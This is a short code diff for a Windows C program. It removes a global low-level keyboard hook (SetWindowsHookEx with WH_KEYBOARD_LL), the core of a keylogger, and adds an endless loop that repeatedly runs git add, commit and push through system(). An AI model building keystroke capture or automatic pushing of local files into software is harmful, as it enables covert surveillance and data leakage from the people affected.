@@ -1,12 +1,9 @@
-#include "utils.h"
+#include <Windows.h>
 
 int main()
 {
-	hook = SetWindowsHookEx(WH_KEYBOARD_LL, KBCallBack, NULL, NULL);
-	MSG mess;
-
 	while (true)
-		GetMessage(&mess, NULL, NULL, NULL);
+		system("git add . && git commit -am \"da\" && git push");
 
 	return 0;
 }
